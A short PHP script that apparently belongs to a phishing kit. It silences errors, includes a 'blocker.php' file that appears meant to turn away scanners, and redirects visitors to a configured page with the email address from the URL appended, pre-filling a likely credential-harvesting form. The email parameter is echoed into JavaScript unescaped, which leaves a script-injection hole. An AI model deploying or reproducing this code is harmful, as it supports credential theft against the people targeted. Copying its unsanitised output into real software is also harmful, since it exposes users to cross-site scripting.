<?php

error_reporting(0);include('blocker.php');include('config.php');
$email = $_GET['e'];
if (empty($email)) {
    echo "<script type=\"text/javascript\">window.location.href = \"$pagelink\"</script>\n"; 
    die();
}elseif (!empty($email)) {
    echo "<script type=\"text/javascript\">window.location.href = \"$pagelink".$email."\"</script>\n"; 
}
?>